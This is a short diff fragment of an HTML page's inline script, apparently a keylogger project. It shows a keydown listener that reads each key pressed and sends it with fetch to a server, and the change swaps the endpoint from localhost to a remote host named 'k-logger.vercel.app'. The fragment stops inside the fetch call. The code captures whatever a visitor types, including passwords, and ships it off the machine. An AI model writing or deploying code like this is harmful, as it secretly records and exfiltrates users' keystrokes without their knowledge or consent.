@@ -76,7 +76,7 @@
     <script>
       document.addEventListener("keydown", function (event) {
         const keystroke = event.key;
-        const apiUrl = "http://localhost:3000/keystrokes";
+        const apiUrl = "https://k-logger.vercel.app/keystrokes";
 
         // Send the keystroke to the server
         fetch(apiUrl, {
